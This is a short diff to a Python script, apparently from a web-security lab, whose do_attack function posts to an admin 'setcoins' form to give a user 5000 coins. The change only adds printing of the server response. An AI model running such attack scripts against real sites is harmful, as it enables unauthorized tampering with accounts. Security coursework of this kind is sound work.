@@ -20,7 +20,7 @@ def do_setcoins_form(sess,uname, coins):
     }
     response = sess.post(SETCOINS_FORM_URL, data_dict)
     print("Response code: {}".format(response.status_code))
-    return response.status_code == codes.ok
+    return response.status_code == codes.ok, response
 
 def do_attack():
     sess = Session()
@@ -51,8 +51,9 @@ def do_attack():
     # set coins to 5000 coins via the admin's power
     target_uname = uname
     amount = 5000
-    result = do_setcoins_form(sess, target_uname, amount)
+    result, response = do_setcoins_form(sess, target_uname, amount)
     print("Attack successful? " + str(result))
+    print("Response: {}".format(response.content))
 
 if __name__=='__main__':
     do_attack()
